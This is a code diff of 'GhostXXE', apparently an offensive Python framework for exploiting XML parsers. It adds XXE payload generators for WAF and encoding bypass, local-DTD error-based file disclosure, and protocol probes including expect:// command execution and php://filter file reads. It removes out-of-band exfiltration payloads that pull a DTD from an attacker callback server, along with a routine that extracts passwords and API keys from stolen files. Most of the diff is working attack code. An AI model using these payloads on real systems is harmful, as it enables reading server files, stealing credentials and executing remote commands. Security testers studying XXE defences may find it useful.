@@ -12,6 +12,7 @@ Version: 2.0
 
 import argparse
 import sys
+import os
 import requests
 import urllib3
 import base64
@@ -43,38 +44,43 @@ class Colors:
 
 
 class Banner:
-    """Display tool banner"""
+    """Display tool banner -- Ghost Ops house style (figlet small, Harley orange)"""
+
+    ORANGE = '\033[38;5;208m'
+    GREY = '\033[38;5;240m'
+
+    ART = r"""
+  ___  _  _   ___   ___  _____  __  ____  ____  __ ___
+ / __|| || | / _ \ / __||_   _| \ \/ /\ \/ /\ \/ /| __|
+| (_ || __ || (_) |\__ \  | |    >  <  >  <  >  < | _|
+ \___||_||_| \___/ |___/  |_|   /_/\_\/_/\_\/_/\_\|___|
+"""
+
+    TAGLINE = ("Ghost Ops Security  |  Kill Chain Replay(TM) -- XML Track  |  "
+               "Advanced XML Exploitation Framework v2.1 | Authorized Use Only")
+
+    FEATURES = (
+        "  [+] XXE Discovery, Parser Fingerprinting & Protocol Enumeration\n"
+        "  [+] Encoding/WAF Bypass Batteries & Local DTD Enumeration\n"
+        "  [+] XSLT & XPATH Injection Testing\n"
+        "  [+] OOB Exfiltration, File Harvesting & Interactive Exploitation"
+    )
+
     @staticmethod
     def show():
-        banner = f"""
-{Colors.HEADER}
-╔═══════════════════════════════════════════════════════════════════════╗
-║                                                                       ║
-║     ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗  ██╗██╗  ██╗███████╗║
-║    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝╚██╗██╔╝╚██╗██╔╝██╔════╝║
-║    ██║  ███╗███████║██║   ██║███████╗   ██║    ╚███╔╝  ╚███╔╝ █████╗  ║
-║    ██║   ██║██╔══██║██║   ██║╚════██║   ██║    ██╔██╗  ██╔██╗ ██╔══╝  ║
-║    ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ██╔╝ ██╗██╔╝ ██╗███████╗║
-║     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝║
-║                                                                       ║
-║                 Advanced XML Exploitation Framework v2.0              ║
-║                      Ghost Ops Security - Red Team                    ║
-║                                                                       ║
-║         ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░          ║
-║                                                                       ║
-║  {Colors.SUCCESS}[+]{Colors.HEADER} XML External Entity (XXE) Discovery & Exploitation         ║
-║  {Colors.SUCCESS}[+]{Colors.HEADER} XSLT & XPATH Injection Testing                            ║
-║  {Colors.SUCCESS}[+]{Colors.HEADER} Out-of-Band (OOB) Data Exfiltration                       ║
-║  {Colors.SUCCESS}[+]{Colors.HEADER} Reverse Shell & Interactive Command Execution              ║
-║                                                                       ║
-║         ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░          ║
-║                                                                       ║
-║              {Colors.WARNING}👻 Where Hackers Fear to Tread 👻{Colors.HEADER}                      ║
-║                                                                       ║
-╚═══════════════════════════════════════════════════════════════════════╝
-{Colors.RESET}
-"""
-        print(banner)
+        use_color = sys.stdout.isatty() and os.environ.get('NO_COLOR') is None
+        if use_color:
+            print(f"{Banner.ORANGE}{Banner.ART}{Style.RESET_ALL}")
+            print(f"{Banner.GREY}{Banner.TAGLINE}{Style.RESET_ALL}")
+            print(f"{Banner.GREY}{'-' * 78}{Style.RESET_ALL}")
+            print(f"{Colors.SUCCESS}{Banner.FEATURES}{Colors.RESET}")
+            print(f"{Banner.GREY}{'-' * 78}{Style.RESET_ALL}")
+        else:
+            print(Banner.ART)
+            print(Banner.TAGLINE)
+            print('-' * 78)
+            print(Banner.FEATURES)
+            print('-' * 78)
 
 
 class OOBServer(BaseHTTPRequestHandler):
@@ -107,11 +113,7 @@ class OOBServer(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header('Content-type', 'application/xml-dtd')
             self.end_headers()
-            # dtd_payload is already bytes, don't encode again
-            if isinstance(OOBServer.dtd_payload, bytes):
-                self.wfile.write(OOBServer.dtd_payload)
-            else:
-                self.wfile.write(OOBServer.dtd_payload.encode())
+            self.wfile.write(OOBServer.dtd_payload.encode())
         else:
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
@@ -469,57 +471,6 @@ public string execute(){
 <xsl:copy-of select="document('{target_url}')"/>
 </xsl:template>
 </xsl:stylesheet>'''
-    
-    @staticmethod
-    def xxe_cdata_exfiltration(callback_url: str, file_path: str) -> Tuple[str, str]:
-        """
-        Advanced CDATA wrapping for reading files with special characters
-        Requires hosting external DTD on attacker server
-        Based on HTB Academy Advanced XXE techniques
-        """
-        # DTD content to host on attacker server
-        dtd_content = '''<!ENTITY joined "%begin;%file;%end;">'''
-        
-        # XML payload to send to target
-        xml_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE email [
-  <!ENTITY % begin "<![CDATA[">
-  <!ENTITY % file SYSTEM "file://{file_path}">
-  <!ENTITY % end "]]>">
-  <!ENTITY % xxe SYSTEM "{callback_url}/xxe.dtd">
-  %xxe;
-]>
-<root>
-<name>test</name>
-<email>&joined;</email>
-</root>'''
-        
-        return xml_payload, dtd_content
-    
-    @staticmethod
-    def xxe_error_based_exfiltration(callback_url: str, file_path: str) -> Tuple[str, str]:
-        """
-        Error-Based XXE for blind exploitation
-        Forces errors to exfiltrate data when no output is displayed
-        Based on HTB Academy Advanced XXE techniques
-        """
-        # DTD content to host on attacker server
-        dtd_content = f'''<!ENTITY % file SYSTEM "file://{file_path}">
-<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">'''
-        
-        # XML payload to send to target
-        xml_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE email [
-  <!ENTITY % remote SYSTEM "{callback_url}/xxe.dtd">
-  %remote;
-  %error;
-]>
-<root>
-<name>test</name>
-<email>test@test.com</email>
-</root>'''
-        
-        return xml_payload, dtd_content
     
     @staticmethod
     def xpath_injection_payloads() -> List[str]:
@@ -967,30 +918,137 @@ xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/">
 </service>
 </definitions>'''
 
+    # ------------------------------------------------------------------
+    # Advanced discovery/enumeration payloads (v2.1)
+    # ------------------------------------------------------------------
+
+    # Known local DTD files whose parameter entities can be redefined for
+    # the local-DTD error-based technique (GoSecure research). Existence of
+    # any of these on the target also fingerprints the OS/software.
+    LOCAL_DTD_CANDIDATES = [
+        ('/usr/share/yelp/dtd/docbookx.dtd', 'ISOamso', 'Linux (GNOME yelp)'),
+        ('/usr/share/xml/fontconfig/fonts.dtd', 'expr', 'Linux (fontconfig)'),
+        ('/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd', 'url.attribute.set', 'Linux (scrollkeeper)'),
+        ('/usr/share/xml/svg/svg10.dtd', 'SVG.ClipPath.extra.class', 'Linux (SVG DTD)'),
+        ('/usr/share/php/PEAR/data/Symfony/Component/DependencyInjection/schema/dic/services/services-1.0.xsd', None, 'Linux (Symfony/PEAR)'),
+        ('/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd', None, 'IBM WebSphere'),
+        ('/usr/share/java/jsp-api-2.2.jar!/javax/servlet/jsp/resources/jspxml.dtd', None, 'Java JSP API'),
+        ('C:\\Windows\\System32\\wbem\\xml\\cim20.dtd', 'CIMName', 'Windows (WBEM)'),
+    ]
+
+    # URL schemes whose availability maps directly to exploitation options.
+    PROTOCOL_PROBES = [
+        ('file', 'file:///etc/hostname', 'local file read (Linux)'),
+        ('file-win', 'file:///C:/Windows/win.ini', 'local file read (Windows)'),
+        ('http', 'http://127.0.0.1:1/ghost', 'SSRF / OOB exfil'),
+        ('ftp', 'ftp://127.0.0.1:1/ghost', 'OOB exfil incl. newlines (Java)'),
+        ('php-filter', 'php://filter/convert.base64-encode/resource=/etc/hostname', 'binary-safe read (PHP)'),
+        ('expect', 'expect://id', 'direct RCE (PHP expect module)'),
+        ('jar', 'jar:http://127.0.0.1:1/!/ghost', 'file write via jar (Java)'),
+        ('netdoc', 'netdoc:/etc/hostname', 'file read alias (legacy Java)'),
+        ('gopher', 'gopher://127.0.0.1:1/_ghost', 'raw TCP SSRF (legacy Java)'),
+        ('data', 'data://text/plain;base64,R0hPU1RfREFUQV9PSw==', 'entity smuggling (PHP)'),
+    ]
+
+    @staticmethod
+    def scheme_probe(url: str) -> str:
+        """Minimal external-entity payload for protocol support probing"""
+        return f'''<?xml version="1.0"?>
+<!DOCTYPE r [ <!ENTITY x SYSTEM "{url}"> ]>
+<r>&x;</r>'''
+
+    @staticmethod
+    def xxe_utf16_bytes(file_path: str, byte_order: str = 'le') -> bytes:
+        """UTF-16 encoded XXE -- byte-level bypass for regex/WAF filters
+        that scan for '<!DOCTYPE' in ASCII"""
+        payload = (f'<?xml version="1.0" encoding="UTF-16"?>'
+                   f'<!DOCTYPE r [ <!ENTITY x SYSTEM "file://{file_path}"> ]>'
+                   f'<r>&x;</r>')
+        codec = 'utf-16-le' if byte_order == 'le' else 'utf-16-be'
+        bom = b'\xff\xfe' if byte_order == 'le' else b'\xfe\xff'
+        return bom + payload.encode(codec)
+
+    @staticmethod
+    def xxe_waf_bypass_variants(file_path: str) -> List[Tuple[str, str]]:
+        """DOCTYPE mutations that dodge naive keyword/regex filters.
+        Returns (variant_name, payload) tuples."""
+        return [
+            ('parameter_entity_indirection',
+             f'''<?xml version="1.0"?>
+<!DOCTYPE r [
+<!ENTITY % p1 "<!ENTITY x SYSTEM 'file://{file_path}'>">
+%p1;
+]>
+<r>&x;</r>'''),
+            ('public_identifier',
+             f'''<?xml version="1.0"?>
+<!DOCTYPE r [ <!ENTITY x PUBLIC "ghost" "file://{file_path}"> ]>
+<r>&x;</r>'''),
+            ('whitespace_mutation',
+             f'''<?xml version="1.0"?>
+<!DOCTYPE\tr\t[\n<!ENTITY\tx\tSYSTEM\n"file://{file_path}"\t>\n]\t>
+<r>&x;</r>'''),
+            ('comment_split_subset',
+             f'''<?xml version="1.0"?>
+<!DOCTYPE r [ <!--ghost--> <!ENTITY x SYSTEM "file://{file_path}"> <!--ghost--> ]>
+<r>&x;</r>'''),
+            ('nested_entity_hop',
+             f'''<?xml version="1.0"?>
+<!DOCTYPE r [
+<!ENTITY % a "file://">
+<!ENTITY % p2 "<!ENTITY x SYSTEM '%a;{file_path}'>">
+%p2;
+]>
+<r>&x;</r>'''),
+            ('no_xml_declaration',
+             f'''<!DOCTYPE r [ <!ENTITY x SYSTEM "file://{file_path}"> ]><r>&x;</r>'''),
+        ]
+
+    @staticmethod
+    def local_dtd_existence_probe(dtd_path: str) -> str:
+        """Load a local DTD as a parameter entity -- response/error deltas
+        vs. a known-missing control path reveal whether the file exists."""
+        return f'''<?xml version="1.0"?>
+<!DOCTYPE r [
+<!ENTITY % d SYSTEM "file://{dtd_path}">
+%d;
+]>
+<r>ghost</r>'''
+
+    @staticmethod
+    def local_dtd_exploit(dtd_path: str, entity_name: str, file_path: str) -> str:
+        """Redefine a parameter entity inside an existing local DTD to get
+        error-based file disclosure without any outbound connectivity."""
+        return f'''<?xml version="1.0"?>
+<!DOCTYPE r [
+<!ENTITY % local_dtd SYSTEM "file://{dtd_path}">
+<!ENTITY % {entity_name} '
+<!ENTITY &#x25; file SYSTEM "file://{file_path}">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+<r>ghost</r>'''
+
+    @staticmethod
+    def reflection_calibrator(marker: str) -> str:
+        """Internal-entity payload used to locate where entity values land
+        in the response, so file contents can be carved out precisely."""
+        return f'''<?xml version="1.0"?>
+<!DOCTYPE r [ <!ENTITY x "{marker}"> ]>
+<r>&x;</r>'''
+
 
 class XXEScanner:
     """Main XXE scanning and exploitation engine"""
     
     def __init__(self, args):
         self.target_url = args.url
+        self.callback_url = args.callback
         self.callback_ip = args.callback_ip
         self.callback_port = args.callback_port or 8080
-        
-        # Build callback URL - respect custom port if provided
-        if args.callback:
-            # User provided full URL
-            self.callback_url = args.callback
-            # Extract port from URL if present, otherwise use callback_port
-            import re
-            port_match = re.search(r':(\d+)', args.callback)
-            if port_match:
-                self.callback_port = int(port_match.group(1))
-        elif args.callback_ip:
-            # Build URL from IP and port
-            self.callback_url = f"http://{args.callback_ip}:{self.callback_port}"
-        else:
-            self.callback_url = None
-        
         self.method = args.method.upper()
         self.headers = self._parse_headers(args.headers)
         self.cookies = self._parse_cookies(args.cookies)
@@ -999,13 +1057,17 @@ class XXEScanner:
         self.timeout = args.timeout
         self.proxy = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
         self.verbose = args.verbose
+        self.harvest = getattr(args, 'harvest', False)
+        self.enum_endpoints = getattr(args, 'enum_endpoints', False)
+        self.loot_dir = getattr(args, 'loot_dir', './loot')
         self.session = requests.Session()
         self.vulnerabilities_found = []
-        self.working_structure = None  # Stores detected XML structure
-        
-        # XML structure learning
-        self.xml_structure = None  # Will be detected from target
-        self.reflection_element = None  # Which element shows in response
+        self.parser_fingerprint = None       # e.g. 'libxml2 (PHP)', 'Xerces (Java)'
+        self.accepted_content_types = []     # content types the target parses
+        self.supported_protocols = []        # URL schemes the parser resolves
+        self.working_read_template = None    # confirmed file-read payload template
+        self.reflection_bounds = None        # (prefix, suffix) around reflected entities
+        self.harvested_loot = {}             # file_path -> content
         
     def _parse_headers(self, headers_str: str) -> Dict:
         """Parse custom headers"""
@@ -1027,18 +1089,26 @@ class XXEScanner:
                     cookies[key.strip()] = value.strip()
         return cookies
     
-    def send_payload(self, payload: str, description: str = "") -> Optional[requests.Response]:
-        """Send XXE payload to target"""
+    def send_payload(self, payload, description: str = "",
+                     content_type: str = None) -> Optional[requests.Response]:
+        """Send XXE payload to target. Accepts str or raw bytes (for
+        UTF-16/encoding-bypass payloads); content_type overrides the
+        default application/xml when set."""
         try:
             if self.verbose:
                 print(f"\n{Colors.INFO}[*] Testing: {description}{Colors.RESET}")
-                print(f"{Colors.PAYLOAD}[*] Payload:\n{payload}{Colors.RESET}")
-            
+                if isinstance(payload, bytes):
+                    print(f"{Colors.PAYLOAD}[*] Payload: <{len(payload)} raw bytes, "
+                          f"starts {payload[:24]!r}>{Colors.RESET}")
+                else:
+                    print(f"{Colors.PAYLOAD}[*] Payload:\n{payload}{Colors.RESET}")
+
             headers = self.headers.copy()
-            
+            xml_content_type = content_type or 'application/xml'
+
             if self.method == 'GET':
                 # GET request with XML in URL parameter
-                headers['Content-Type'] = 'application/xml'
+                headers['Content-Type'] = xml_content_type
                 params = {self.param: payload} if self.param else {}
                 
                 if self.verbose and self.param:
@@ -1083,7 +1153,7 @@ class XXEScanner:
                     )
                 else:
                     # No parameter specified, send as raw XML body
-                    headers['Content-Type'] = 'application/xml'
+                    headers['Content-Type'] = xml_content_type
                     response = self.session.post(
                         self.target_url,
                         data=payload,
@@ -1094,7 +1164,7 @@ class XXEScanner:
                         verify=False
                     )
             else:  # POST with raw XML body
-                headers['Content-Type'] = 'application/xml'
+                headers['Content-Type'] = xml_content_type
                 response = self.session.post(
                     self.target_url,
                     data=payload,
@@ -1119,59 +1189,29 @@ class XXEScanner:
         """Detect basic XXE vulnerability with comprehensive payloads"""
         print(f"\n{Colors.HEADER}[*] Phase 2: Testing XXE File Read Exploitation{Colors.RESET}")
         
-        # If user specified a file with -f, test ONLY that file
-        # Otherwise test common files
-        if self.file_path and self.file_path != '/etc/passwd':
-            # User specified a custom file - test ONLY this
-            test_files = [self.file_path]
-            print(f"{Colors.INFO}[*] Testing user-specified file: {self.file_path}{Colors.RESET}")
-        else:
-            # Test common files
-            test_files = [
-                '/etc/passwd',
-                '/etc/hostname',
-                '/etc/hosts',
-                'C:\\Windows\\win.ini',
-                'C:\\boot.ini'
-            ]
+        test_files = [
+            '/etc/passwd',
+            '/etc/hostname',
+            '/etc/hosts',
+            'C:\\Windows\\win.ini',
+            'C:\\boot.ini'
+        ]
         
         for file_path in test_files:
             print(f"\n{Colors.INFO}[*] Target file: {file_path}{Colors.RESET}")
             
-            # Try multiple payload variations using detected structure
-            payloads_to_try = []
+            # Try multiple payload variations
+            payload_methods = [
+                ('Classic DTD', lambda f: PayloadGenerator.xxe_classic_file_read(f)),
+                ('Standard XXE', lambda f: PayloadGenerator.xxe_basic_file_read(f)[0]),
+                ('PHP Base64 Wrapper', lambda f: PayloadGenerator.xxe_php_wrapper_base64(f)),
+                ('XInclude', lambda f: PayloadGenerator.xxe_xinclude_file_read(f)),
+            ]
             
-            if self.working_structure:
-                # Use detected working structure
-                print(f"{Colors.INFO}[*] Using previously detected XML structure{Colors.RESET}")
-                
-                # Build payloads with working structure
-                # Replace test_value placeholder with actual XXE payload
-                
-                # Classic file read
-                classic = self.working_structure.replace(
-                    '<!ENTITY ghosttest "{test_value}">',
-                    f'<!ENTITY xxe SYSTEM "file://{file_path}">'
-                ).replace('&ghosttest;', '&xxe;')
-                payloads_to_try.append(('Classic DTD (Detected Structure)', classic))
-                
-                # PHP Base64 wrapper
-                php_wrapper = self.working_structure.replace(
-                    '<!ENTITY ghosttest "{test_value}">',
-                    f'<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">'
-                ).replace('&ghosttest;', '&xxe;')
-                payloads_to_try.append(('PHP Base64 Wrapper (Detected Structure)', php_wrapper))
-            
-            # Also try standard payload formats as fallback
-            payloads_to_try.extend([
-                ('Classic DTD', PayloadGenerator.xxe_classic_file_read(file_path)),
-                ('Standard XXE', PayloadGenerator.xxe_basic_file_read(file_path)[0]),
-                ('PHP Base64 Wrapper', PayloadGenerator.xxe_php_wrapper_base64(file_path)),
-                ('XInclude', PayloadGenerator.xxe_xinclude_file_read(file_path)),
-            ])
-            
-            for method_name, payload in payloads_to_try:
+            for method_name, payload_func in payload_methods:
                 try:
+                    payload = payload_func(file_path)
+                    
                     response = self.send_payload(
                         payload,
                         f"{method_name} - {file_path}"
@@ -1185,39 +1225,22 @@ class XXEScanner:
                         
                         # Check if base64 encoded
                         import re
-                        # Look for base64 in response (might be embedded in HTML/text)
-                        b64_pattern = r'([A-Za-z0-9+/]{40,}={0,2})'
-                        b64_matches = re.findall(b64_pattern, response.text)
-                        
-                        decoded_content = None
-                        if b64_matches:
-                            print(f"{Colors.WARNING}[*] Found base64 data in response, attempting decode...{Colors.RESET}")
-                            for b64_data in b64_matches:
-                                try:
-                                    import base64
-                                    decoded = base64.b64decode(b64_data).decode('utf-8', errors='ignore')
-                                    # Check if decoded content looks like file contents
-                                    if len(decoded) > 20 and any(ind in decoded for ind in ['root:', '<?php', '/', '$']):
-                                        decoded_content = decoded
-                                        print(f"\n{Colors.SUCCESS}[+] Successfully decoded base64!{Colors.RESET}")
-                                        print(f"{Colors.INFO}[*] Decoded content:{Colors.RESET}")
-                                        print(decoded[:800])
-                                        
-                                        # Try to extract secrets
-                                        self._extract_secrets_from_content(decoded, file_path)
-                                        break
-                                except:
-                                    continue
-                        
-                        if not decoded_content:
+                        if re.match(r'^[A-Za-z0-9+/]+=*$', response.text.strip()):
+                            print(f"{Colors.WARNING}[*] Response appears to be base64 encoded{Colors.RESET}")
+                            try:
+                                import base64
+                                decoded = base64.b64decode(response.text.strip()).decode('utf-8', errors='ignore')
+                                print(decoded[:500])
+                            except:
+                                print(response.text[:500])
+                        else:
                             print(response.text[:500])
                         
                         self.vulnerabilities_found.append({
                             'type': f'XXE File Read - {method_name}',
                             'payload': payload,
                             'file': file_path,
-                            'method': method_name,
-                            'content': decoded_content if decoded_content else response.text[:1000]
+                            'method': method_name
                         })
                         return True
                         
@@ -1292,111 +1315,6 @@ class XXEScanner:
         
         return False
     
-    def _extract_secrets_from_content(self, content: str, filename: str):
-        """Extract secrets like API keys, passwords from file content"""
-        print(f"\n{Colors.HEADER}[*] Analyzing file for secrets...{Colors.RESET}")
-        
-        import re
-        
-        secrets_found = False
-        patterns = {
-            'API Key': [
-                r'[\$]?api_key\s*=\s*["\']([^"\']+)["\']',
-                r'API_KEY\s*=\s*["\']([^"\']+)["\']',
-            ],
-            'Password': [
-                r'[\$]?(?:password|passwd|pwd)\s*=\s*["\']([^"\']+)["\']',
-                r'PASSWORD\s*=\s*["\']([^"\']+)["\']',
-            ],
-            'Database': [
-                r'[\$]?db_(?:pass|password|pwd)\s*=\s*["\']([^"\']+)["\']',
-                r'[\$]?db_(?:host|user|name)\s*=\s*["\']([^"\']+)["\']',
-            ],
-            'Secret': [
-                r'[\$]?secret\s*=\s*["\']([^"\']+)["\']',
-                r'SECRET_KEY\s*=\s*["\']([^"\']+)["\']',
-            ],
-        }
-        
-        for secret_type, secret_patterns in patterns.items():
-            for pattern in secret_patterns:
-                matches = re.findall(pattern, content, re.IGNORECASE)
-                if matches:
-                    if not secrets_found:
-                        print(f"\n{Colors.SUCCESS}{'='*70}{Colors.RESET}")
-                        print(f"{Colors.SUCCESS}🔑 SECRETS FOUND IN {filename}:{Colors.RESET}")
-                        print(f"{Colors.SUCCESS}{'='*70}{Colors.RESET}")
-                        secrets_found = True
-                    
-                    print(f"{Colors.ERROR}{secret_type}: {matches[0]}{Colors.RESET}")
-                    break
-        
-        if secrets_found:
-            print(f"{Colors.SUCCESS}{'='*70}{Colors.RESET}\n")
-        else:
-            print(f"{Colors.INFO}[*] No obvious secrets found{Colors.RESET}")
-            print(f"\n{Colors.INFO}[*] XXE CONFIRMED but direct file read blocked{Colors.RESET}")
-            print(f"\n{Colors.HEADER}╔════════════════════════════════════════════════════════════╗{Colors.RESET}")
-            print(f"{Colors.HEADER}║          RECOMMENDED NEXT STEPS                            ║{Colors.RESET}")
-            print(f"{Colors.HEADER}╚════════════════════════════════════════════════════════════╝{Colors.RESET}")
-            print(f"\n{Colors.SUCCESS}[+] Entity substitution works - XXE is present!{Colors.RESET}")
-            print(f"{Colors.INFO}[*] File read may be blocked by filters/restrictions{Colors.RESET}")
-            
-            print(f"\n{Colors.WARNING}→ Try These Techniques:{Colors.RESET}")
-            print(f"\n1. {Colors.SUCCESS}PHP Base64 Wrapper{Colors.RESET} (bypass special characters)")
-            print(f"   {Colors.INFO}Manual test:{Colors.RESET}")
-            print(f"   <!DOCTYPE email [<!ENTITY xxe SYSTEM")
-            print(f"     \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>")
-            
-            print(f"\n2. {Colors.SUCCESS}Out-of-Band (OOB) Exfiltration{Colors.RESET} (blind XXE)")
-            print(f"   {Colors.INFO}Command:{Colors.RESET}")
-            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
-            print(f"     --oob --callback-ip YOUR_IP --callback-port 8080 -v")
-            
-            print(f"\n3. {Colors.SUCCESS}Try Different Files:{Colors.RESET}")
-            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
-            print(f"     -f /etc/hostname -v")
-            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
-            print(f"     -f index.php -v")
-            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
-            print(f"     -f config.php -v")
-            
-            print(f"\n4. {Colors.SUCCESS}Error-Based Exfiltration:{Colors.RESET}")
-            print(f"   {Colors.INFO}Manual test:{Colors.RESET}")
-            print(f"   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">")
-            print(f"   <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%xxe;'>\">")
-            print(f"   %eval;%exfil;]>")
-            
-            print(f"\n5. {Colors.SUCCESS}Advanced Mode{Colors.RESET} (more techniques)")
-            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
-            print(f"     --advanced -v")
-            
-            print(f"\n6. {Colors.SUCCESS}Interactive Testing:{Colors.RESET}")
-            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
-            print(f"     --interactive")
-            
-            print(f"\n{Colors.WARNING}→ Manual Payload Testing:{Colors.RESET}")
-            print(f"   Use Burp Suite to test custom payloads:")
-            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
-            print(f"     --proxy http://127.0.0.1:8080 -v")
-            
-            print(f"\n{Colors.INFO}→ Common Reasons for Blocked File Read:{Colors.RESET}")
-            print(f"   • PHP safe_mode or open_basedir restrictions")
-            print(f"   • libxml LIBXML_NOENT disabled")
-            print(f"   • File path restrictions/whitelist")
-            print(f"   • XML parser blocks file:// protocol")
-            print(f"   • Special characters breaking XML syntax")
-            
-            print(f"\n{Colors.SUCCESS}→ Recommended Attack Path:{Colors.RESET}")
-            print(f"   1. Try PHP wrapper first (handles special chars)")
-            print(f"   2. Test OOB if direct read fails")
-            print(f"   3. Try error-based if OOB not possible")
-            print(f"   4. Test different file paths")
-            print(f"   5. Use interactive mode for custom payloads")
-            print(f"\n{Colors.HEADER}{'═'*60}{Colors.RESET}\n")
-        
-        return False
-    
     def detect_xxe_entity_injection(self) -> bool:
         """Test if XML entities are processed (precursor to XXE)"""
         print(f"\n{Colors.HEADER}[*] Phase 1: Testing XML Entity Processing{Colors.RESET}")
@@ -1408,85 +1326,49 @@ class XXEScanner:
             "XXE_VULN_TEST_2024"
         ]
         
-        # Try multiple XML structure variations
-        xml_structures = [
-            # Structure 1: HTB format with 'n' instead of 'name'
-            '''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
-  <!ENTITY ghosttest "{test_value}">
-]>
-<root>
-<n>&ghosttest;</n>
-<tel>1234567890</tel>
-<email>&ghosttest;</email>
-<message>test</message>
-</root>''',
-            # Structure 2: Standard format with 'name'
-            '''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
-  <!ENTITY ghosttest "{test_value}">
-]>
-<root>
-<name>&ghosttest;</name>
-<tel>1234567890</tel>
-<email>&ghosttest;</email>
-<message>test</message>
-</root>''',
-            # Structure 3: Simple email-only
-            '''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE email [
-  <!ENTITY ghosttest "{test_value}">
-]>
-<email>&ghosttest;</email>''',
-            # Structure 4: Data/value structure
-            '''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE data [
-  <!ENTITY ghosttest "{test_value}">
-]>
-<data>
-<value>&ghosttest;</value>
-</data>''',
-        ]
-        
         for test_value in test_values:
-            for structure_template in xml_structures:
-                # Create entity substitution payload
-                payload = structure_template.replace('{test_value}', test_value)
+            # Create entity substitution payload
+            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY ghosttest "{test_value}">
+]>
+<root>
+<name>ghost</name>
+<tel>1234567890</tel>
+<email>&ghosttest;</email>
+<message>test</message>
+</root>'''
+            
+            response = self.send_payload(
+                payload,
+                f"Entity Substitution Test - {test_value}"
+            )
+            
+            if response:
+                # Analyze response
+                analysis = self._analyze_response_reflection(response, test_value)
                 
-                response = self.send_payload(
-                    payload,
-                    f"Entity Substitution Test - {test_value}"
-                )
-                
-                if response:
-                    # Analyze response
-                    analysis = self._analyze_response_reflection(response, test_value)
+                if analysis['reflected']:
+                    print(f"{Colors.SUCCESS}[+] CRITICAL: XML Entity Substitution Working!{Colors.RESET}")
+                    print(f"{Colors.SUCCESS}[+] Entity value '{test_value}' was reflected in response{Colors.RESET}")
+                    print(f"{Colors.INFO}[*] Reflection points: {len(analysis['reflection_points'])}{Colors.RESET}")
+                    print(f"{Colors.INFO}[*] Response type: {analysis['reflection_type']}{Colors.RESET}")
+                    print(f"\n{Colors.WARNING}[!] This confirms XXE vulnerability - proceeding to exploitation{Colors.RESET}")
                     
-                    if analysis['reflected']:
-                        print(f"{Colors.SUCCESS}[+] CRITICAL: XML Entity Substitution Working!{Colors.RESET}")
-                        print(f"{Colors.SUCCESS}[+] Entity value '{test_value}' was reflected in response{Colors.RESET}")
-                        print(f"{Colors.INFO}[*] Reflection points: {len(analysis['reflection_points'])}{Colors.RESET}")
-                        print(f"{Colors.INFO}[*] Response type: {analysis['reflection_type']}{Colors.RESET}")
-                        print(f"{Colors.INFO}[*] Working XML structure detected and saved{Colors.RESET}")
-                        print(f"\n{Colors.WARNING}[!] This confirms XXE vulnerability - proceeding to exploitation{Colors.RESET}")
-                        
-                        # Store the working structure for later use
-                        self.working_structure = structure_template
-                        
-                        # Show response preview
-                        print(f"\n{Colors.INFO}[*] Response Preview:{Colors.RESET}")
-                        preview = response.text[:300]
-                        # Highlight our test value
-                        preview = preview.replace(test_value, f"{Colors.SUCCESS}{test_value}{Colors.RESET}")
-                        print(preview)
-                        
-                        self.vulnerabilities_found.append({
-                            'type': 'XML Entity Injection - XXE Confirmed',
-                            'payload': payload,
-                            'test_value': test_value,
-                            'analysis': analysis
-                        })
-                        return True
+                    # Show response preview
+                    print(f"\n{Colors.INFO}[*] Response Preview:{Colors.RESET}")
+                    preview = response.text[:300]
+                    # Highlight our test value
+                    preview = preview.replace(test_value, f"{Colors.SUCCESS}{test_value}{Colors.RESET}")
+                    print(preview)
+                    
+                    self.vulnerabilities_found.append({
+                        'type': 'XML Entity Injection - XXE Confirmed',
+                        'payload': payload,
+                        'test_value': test_value,
+                        'analysis': analysis
+                    })
+                    return True
         
         print(f"{Colors.WARNING}[-] XML entities not being processed{Colors.RESET}")
         print(f"{Colors.INFO}[*] Target may not be vulnerable to XXE{Colors.RESET}")
@@ -1888,384 +1770,6 @@ class XXEScanner:
         print(f"{Colors.WARNING}[-] XPATH injection not detected{Colors.RESET}")
         return False
     
-    def test_expect_rce(self, command: str = "id") -> bool:
-        """Test RCE using PHP expect:// wrapper"""
-        print(f"\n{Colors.HEADER}[*] Testing RCE with expect:// wrapper{Colors.RESET}")
